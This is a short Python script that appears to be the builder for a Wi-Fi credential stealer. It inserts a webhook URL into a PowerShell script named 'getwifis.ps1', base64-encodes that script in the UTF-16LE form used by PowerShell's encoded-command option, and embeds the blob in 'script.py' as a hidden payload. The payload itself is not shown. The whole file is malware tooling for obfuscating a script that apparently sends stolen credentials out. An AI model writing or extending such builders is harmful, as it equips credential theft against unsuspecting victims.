import re
import sys
from base64 import b64encode

def main():

    hookurl = sys.argv[1]

    with open('getwifis.ps1', 'r+') as file:
        content = file.read()
        new_content = re.sub('WEBHOOK_URL_HERE', hookurl, content)
        b64ps = b64encode(new_content.encode('utf16')[2:]).decode()

    with open('script.py', 'r+') as file:
        content = file.read()
        regex = r'(?<=b64 = ")[^"]*(?=")'
        new_content = re.sub(regex, b64ps, content)
        file.seek(0)
        file.write(new_content)
        file.truncate()

if __name__ == "__main__":
    main()
